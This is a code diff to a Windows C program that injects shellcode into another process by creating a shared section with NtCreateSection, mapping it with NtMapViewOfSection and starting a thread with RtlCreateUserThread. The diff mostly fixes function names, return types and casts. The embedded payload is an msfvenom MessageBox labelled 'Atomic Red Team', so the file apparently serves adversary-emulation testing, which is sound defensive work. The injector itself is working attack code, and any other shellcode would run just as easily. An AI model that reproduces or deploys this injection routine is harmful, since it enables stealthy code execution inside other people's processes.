@@ -1,7 +1,6 @@
 #include <windows.h>
 #include <stdio.h>
 #include <tlhelp32.h>
-#pragma comment(lib, "ntdll")
 
 
 // msfvenom -a x64 --platform windows -p windows/x64/messagebox TEXT="Atomic Red Team" -f csharp
@@ -34,10 +33,17 @@ unsigned char shellcode[] = {0xfc,0x48,0x81,0xe4,0xf0,0xff,
 
 unsigned int shellcode_len = sizeof(shellcode);
 
+// http://undocumented.ntinternals.net/UserMode/Undocumented%20Functions/Executable%20Images/RtlCreateUserThread.html
 typedef struct _CLIENT_ID {
 	HANDLE UniqueProcess;
 	HANDLE UniqueThread;
 } CLIENT_ID, *PCLIENT_ID;
+
+// http://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FNT%20Objects%2FSection%2FSECTION_INHERIT.html
+typedef enum _SECTION_INHERIT {
+	ViewShare = 1,
+	ViewUnmap = 2
+} SECTION_INHERIT, *PSECTION_INHERIT;	
 
 typedef struct _UNICODE_STRING {
 	USHORT Length;
@@ -45,6 +51,7 @@ typedef struct _UNICODE_STRING {
 	_Field_size_bytes_part_(MaximumLength, Length) PWCH Buffer;
 } UNICODE_STRING, *PUNICODE_STRING;
 
+// https://processhacker.sourceforge.io/doc/ntbasic_8h_source.html#l00186
 typedef struct _OBJECT_ATTRIBUTES {
 	ULONG Length;
 	HANDLE RootDirectory;
@@ -54,6 +61,7 @@ typedef struct _OBJECT_ATTRIBUTES {
 	PVOID SecurityQualityOfService;
 } OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;
 
+// https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FNT%20Objects%2FSection%2FNtCreateSection.html
 typedef NTSTATUS (NTAPI * NtCreateSection_t)(
 	OUT PHANDLE SectionHandle,
 	IN ULONG DesiredAccess,
@@ -63,6 +71,7 @@ typedef NTSTATUS (NTAPI * NtCreateSection_t)(
 	IN ULONG SectionAttributes,
 	IN HANDLE FileHandle OPTIONAL); 
 
+// https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FNT%20Objects%2FSection%2FNtMapViewOfSection.html
 typedef NTSTATUS (NTAPI * NtMapViewOfSection_t)(
 	HANDLE SectionHandle,
 	HANDLE ProcessHandle,
@@ -114,7 +123,7 @@ int FindProcess(const char *procname) {
         return pid;
 }
 
-int FindThread(int pid) {
+HANDLE FindThread(int pid) {
     HANDLE hThread = NULL;
     THREADENTRY32 thEntry;
 
@@ -132,7 +141,7 @@ int FindThread(int pid) {
     return hThread;
 }
 
-int InjectSection(HANDLE hProc, unsigned char *shellcode, unsigned int shellcode_len)
+int Inject(HANDLE hProc, unsigned char *shellcode, unsigned int shellcode_len)
 {
     HANDLE hSection = NULL;
     PVOID pLocalSectionView = NULL;
@@ -142,7 +151,7 @@ int InjectSection(HANDLE hProc, unsigned char *shellcode, unsigned int shellcode
     // Get pointers to the functions we need from ntdll.dll
     NtCreateSection_t NtCreateSection = (NtCreateSection_t) GetProcAddress(GetModuleHandle("NTDLL.DLL"), "NtCreateSection");
     if(NtCreateSection == NULL) return -1;
-    NtMapViewOfSection_t NtMapViewOfSection = (NtCreateSection_t) GetProcAddress(GetModuleHandle("NTDLL.DLL"), "NtMapViewOfSection");
+    NtMapViewOfSection_t NtMapViewOfSection = (NtMapViewOfSection_t) GetProcAddress(GetModuleHandle("NTDLL.DLL"), "NtMapViewOfSection");
     if(NtMapViewOfSection == NULL) return -1;
     RtlCreateUserThread_t RtlCreateUserThread = (RtlCreateUserThread_t) GetProcAddress(GetModuleHandle("NTDLL.DLL"), "RtlCreateUserThread");
     if(RtlCreateUserThread == NULL) return -1;
@@ -167,6 +176,8 @@ int InjectSection(HANDLE hProc, unsigned char *shellcode, unsigned int shellcode
         return 0;
     }
 
+    return -1;
+
     
 }
 
@@ -181,7 +192,7 @@ int main(int argc, char *argv[]) {
         hProc = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE, FALSE, pid);
 
         if(hProc != NULL) {
-            InjectContext(pid, hProc, shellcode, shellcode_len);
+            Inject(hProc, shellcode, shellcode_len);
             CloseHandle(hProc);
         } else {
             printf("Error opening process.\n");
